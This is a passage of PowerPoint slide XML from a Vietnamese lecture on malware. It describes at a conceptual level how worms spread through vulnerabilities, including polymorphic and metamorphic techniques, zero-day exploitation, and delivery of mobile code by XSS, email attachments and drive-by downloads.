                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Multi-exploit (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>đa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> k</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>hai thác</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2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Worm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> mới xâm nhập hệ thống bằng nhiều cách khác nhau, sử dụng các khai thác đối với các máy chủ Web, trình duyệt, e-mail, chia sẻ tệp tin và các ứng dụng dựa trên </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>mạng khác</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>; hoặc thông qua các ph</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ơng tiện chia sẻ</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" i="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ultrafast spreading </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>(lây lan nhanh)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Polymorphic (đa hình)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Metamorphic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> (siêu hình)</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3717225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451513" y="381000"/>
            <a:ext cx="8911687" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Cơ chế lan truyền khai thác lỗ hổng – Worm</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1828800"/>
            <a:ext cx="9448800" cy="4189514"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Kỹ thuật Worm (tiếp)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" i="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Phương </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>tiện </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>vận</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chuyển</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>: Bởi vì</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> worm </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>có thể nhanh chóng xâm nhập một số lượng lớn các hệ thống, chúng rất lý tưởng cho việc </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>lây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lan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="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các công cụ tấn công khác, chẳng hạn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>như </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>DDoS bot, rootkits, spyware, spam email-generator</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="240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pPr algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Khai </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>thác </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>lỗ hổng </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>zero-day</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" noProof="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0367104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524000" y="152400"/>
            <a:ext cx="8911687" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Cơ chế lan truyền khai thác lỗ hổng – Worm</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="1981200"/>
            <a:ext cx="11201400" cy="4189514"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Mobile code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Là c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ác </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, macro hoặc các </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>lệnh portable có thể đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ợc chuyển đến các hệ thống khác nhau nh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ng thực thi ngữ nghĩa giống nhau.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1">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a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Được truyền t</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ừ một hệ thống từ xa đến một hệ thống địa phương</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, thực thi không cần lệnh t</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ờng minh của ng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ời dùng</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Có thể hoạt động như một </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> chế vận chuyển </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>viru</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, các </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>worms</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, và Trojan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> đến mục tiêu</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">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Ph</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ơng tiện </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>phổ biến</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> của mobile code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Java Applet, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>JavaScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, ActiveX</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, VBScript</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="240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a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Phương thức thực thi phổ biến trên local: XSS, email attachments, drive-by-downloads</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9388944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524000" y="152400"/>
            <a:ext cx="8911687" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Cơ chế lan truyền khai thác lỗ hổng – Worm</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="1981200"/>
            <a:ext cx="11201400" cy="4189514"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="en-US" b="1">
